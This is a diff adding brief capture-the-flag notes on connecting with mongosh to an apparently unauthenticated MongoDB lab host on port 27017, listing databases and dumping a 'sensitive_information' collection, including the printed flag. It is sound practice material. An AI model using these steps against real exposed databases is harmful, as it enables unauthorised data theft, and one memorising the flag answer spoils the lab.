@@ -1,0 +1,28 @@
+MongoDB
+TCP 27017
+
+To connect use mongosh tool
+Example: mongosh 10.129.134.86
+
+Addtional comands to get data
+
+admin> show dbs
+admin                  32.00 KiB
+config                 72.00 KiB
+local                  72.00 KiB
+sensitive_information  32.00 KiB
+users                  32.00 KiB
+
+
+use sensitive_information
+
+sensitive_information> show collections
+flag
+
+sensitive_information> db.flag.find().pretty()
+[
+  {
+    _id: ObjectId('630e3dbcb82540ebbd1748c5'),
+    flag: '1b6e6fb359e7c40241b6d431427ba6ea'
+  }
+]
